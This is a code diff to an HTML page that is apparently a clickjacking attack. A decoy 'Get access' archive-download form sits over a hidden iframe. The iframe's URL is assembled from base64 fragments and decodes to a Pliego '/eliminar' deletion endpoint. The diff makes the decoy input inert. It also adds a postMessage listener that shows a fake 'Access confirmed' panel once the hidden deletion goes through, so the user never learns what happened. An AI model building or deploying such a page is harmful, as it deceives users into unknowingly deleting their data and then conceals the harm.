@@ -89,6 +89,20 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
   font-size: 11px; color: var(--muted); line-height: 1.5;
   z-index: 2; pointer-events: none;
 }
+
+/* ── SUCCESS STATE (shown after postMessage from iframe) ── */
+.success-panel {
+  position: fixed; top: 56px; left: 820px; width: 400px;
+  background: #F0FDF4; border: 1px solid #BBF7D0;
+  border-top: 3px solid #16A34A;
+  border-radius: 0 0 12px 12px; padding: 22px 20px 24px;
+  z-index: 3; display: none;
+  box-shadow: 0 4px 16px rgba(0,0,0,.07);
+}
+.success-panel.show { display: block; }
+.sp-icon { font-size: 22px; margin-bottom: 10px; }
+.sp-title { font-size: 15px; font-weight: 800; color: #15803D; margin-bottom: 5px; }
+.sp-sub { font-size: 13px; color: #166534; line-height: 1.6; }
 </style>
 </head>
 <body>
@@ -112,11 +126,8 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
 </div>
 
 <div class="email-label">Email address</div>
-<input class="fake-email-input" type="email" name="email"
-  placeholder="your@email.com"
-  aria-label="Email address to receive archive access"
-  tabindex="0" />
-<button class="fake-get-btn" onclick="void(0)" tabindex="0">Get access</button>
+<div class="fake-email-input" role="textbox" aria-label="Email address">your@email.com</div>
+<button class="fake-get-btn" onclick="void(0)" tabindex="-1" aria-hidden="true">Get access</button>
 <div class="sb-recaptcha">
   Access delivered via <strong>Pliego Editions</strong> · Protected by reCAPTCHA
 </div>
@@ -158,6 +169,13 @@ h1 { font-size: 30px; font-weight: 800; line-height: 1.2; letter-spacing: -.02em
   </div>
 </div>
 
+<!-- Success panel (shown after iframe postMessage) -->
+<div class="success-panel" id="success-panel">
+  <div class="sp-icon">✓</div>
+  <div class="sp-title">Access confirmed</div>
+  <div class="sp-sub" id="sp-sub">Your download link has been sent. Check your inbox — the link expires in 48 hours.</div>
+</div>
+
 <script>
 // Assemble Pliego delete URL at runtime from base64 fragments
 setTimeout(function() {
@@ -169,6 +187,23 @@ setTimeout(function() {
   document.getElementById('victim-frame').src = atob(p.join(''));
 }, 500);
 // decodes to: https://pliego-len3.onrender.com/eliminar
+
+// Listen for postMessage from iframe when form is submitted
+window.addEventListener('message', function(e) {
+  if (e.data && e.data.type === 'pliego-deleted') {
+    // Hide the decoy form elements
+    document.querySelector('.email-label').style.display = 'none';
+    document.querySelector('.fake-email-input').style.display = 'none';
+    document.querySelector('.fake-get-btn').style.display = 'none';
+    document.querySelector('.sb-recaptcha').style.display = 'none';
+    document.querySelector('.sb-title').textContent = 'Archive access sent';
+    // Show success panel
+    var email = e.data.email || '';
+    if (email) document.getElementById('sp-sub').textContent =
+      'Your download link has been delivered to ' + email + '. Check your inbox — it expires in 48 hours.';
+    document.getElementById('success-panel').classList.add('show');
+  }
+});
 </script>
 
 </body>
